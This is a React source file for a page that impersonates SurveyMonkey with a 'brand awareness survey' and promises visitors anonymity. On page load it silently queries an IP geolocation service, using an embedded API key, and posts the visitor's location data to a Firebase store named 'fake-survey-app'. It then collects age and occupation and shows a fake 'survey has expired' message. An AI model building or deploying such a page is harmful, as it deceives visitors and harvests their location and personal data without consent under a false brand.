import React, { useState, useEffect } from "react";
import classes from "./App.module.css";
import axios from "axios";
import Loader from "./Loader";
import img from './1.png'

const App = () => {
  const [age, setAge] = useState("");
  const [profession, setProfession] = useState("");
  const [loader, setLoader] = useState(false);
  // const [locationData, setLocationData] = useState("");
  const [requiredProfessionAlert, setRequiredProfessionAlert] = useState(false);
  const [requiredAgeAlert, setRequiredAgeAlert] = useState(false);
  const [oops, setOops] = useState(false);

  useEffect(() => {
    fetch("https://api.ipregistry.co/?key=rklg5ykj756reab1")
      .then((res) => res.json())
      .then((data) => {
        console.log(data);
        // setLocationData(data);
          axios
            .post(
              "https://fake-survey-app-default-rtdb.firebaseio.com/info.json",
              data
            )
            .then((res) => {
              console.log(res);
            });
      });
  }, []);

  const chnageProfessionHandler = (e) => {
    setProfession(e.target.value);
  };

  const changeAgeHandlet = (e) => {
    setAge(e.target.value);
  };

  const submitHandler = () => {
    if (!age || !profession) {
      if (!age) {
        setRequiredAgeAlert(true);
      } else {
        setRequiredAgeAlert(false);
      }
      if (!profession) {
        setRequiredProfessionAlert(true);
      } else {
        setRequiredProfessionAlert(false);
      }
      return;
    }

    const bandeKaPersonalData = {
      age,
      occupation: profession,
    };
    setLoader(true);

    axios
      .post(
        "https://fake-survey-app-default-rtdb.firebaseio.com/info.json",
        bandeKaPersonalData
      )
      .then((res) => {
        console.log(res);
        setLoader(false);
        setOops(true);
      });
  };

  return (
    <div className={classes.app}>
      <div className={classes.navbar}>
        <p>
          survey<strong>monkey</strong>
        </p>
      </div>

      <main className={classes.mainpage}>
        <div className={classes.whitebox}>
          <h2 className={classes.major}>
            Brand awareness survey and the use of online brands.
          </h2>
          <p className={classes.leftText}>
            This is a quick survey containg few questions based on brand
            awareness.
          </p>
          <p className={classes.leftText}>
            The survey will be completely anonymous.
          </p>
        </div>

        <div style={{marginBottom: '8px'}} className={[classes.whitebox, classes.minht].join(" ")}>
        {!oops ? <>
          {!loader ? (
            <>
              <p className={classes.leftText2}>Let's get started</p>
              <div className={classes.formpart}>
                <input
                  type="text"
                  className={classes.inputarea}
                  placeholder="Current occupation?"
                  onChange={chnageProfessionHandler}
                  value={profession}
                />
                {requiredProfessionAlert ? (
                  <p className={classes.requiredField}>
                    This field is required
                  </p>
                ) : null}
                <input
                  className={classes.inputarea}
                  type="number"
                  placeholder="Your age"
                  onChange={changeAgeHandlet}
                  value={age}
                />
                {requiredAgeAlert ? (
                  <p className={classes.requiredField}>
                    This field is required
                  </p>
                ) : null}
              </div>

              <button onClick={submitHandler} className={classes.nextbtn}>
                Next
              </button>
            </>
          ) : (
            <>
              <div className={classes.loader}>
                <Loader />
              </div>
            </>
          )}
          </> : 
          <>
            <h2 className={classes.major}>
              :/ Oops
            </h2>
            <p className={classes.leftText}>Looks like the survey has expired.</p>
          </>}
        </div>

        <div>
        <img className={classes.imglogo} src={img} alt='SurveyMonkey' />
      </div>
      </main>

      
    </div>
  );
};

export default App;
